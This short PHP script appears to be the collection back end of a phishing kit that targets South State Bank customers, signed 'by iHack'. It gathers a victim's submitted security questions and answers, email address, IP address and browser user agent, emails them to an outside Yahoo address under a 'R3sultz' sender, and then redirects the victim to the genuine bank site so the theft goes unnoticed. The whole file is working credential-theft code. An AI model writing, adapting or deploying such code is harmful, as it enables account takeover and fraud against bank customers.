<?

$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$useragent = $_SERVER['HTTP_USER_AGENT']; 

$message .= "********* \n";

$message .= " Security Questions \n";
$message .= "********* \n";
$message .= "Question 1: ".$_POST['question1']."\n";
$message .= "Answer 1: ".$_POST['answer1']."\n";
$message .= "Question 2: ".$_POST['question2']."\n";
$message .= "Answer 2: ".$_POST['answer2']."\n";
$message .= "Question 3: ".$_POST['question3']."\n";
$message .= "Answer 3: ".$_POST['answer3']."\n";
$message .= "Email: ".$_POST['question4']."\n";

$message .= "***** \n";
$message .= "IP Address: ".$ip."\n";
$message .= "User Agent: ".$useragent."\n";
$message .= "Date: ".$adddate."\n";
$message .= " - by iHack\n";


$subject="SSB QUEST | $ip";
$from= "From: R3sultz<@SSb>";
	 

	mail("peekay@yahoo.com


", "$subject", $message, $from);
	  
 {
   header("Location:https://www.southstatebank.com/");
 }

?>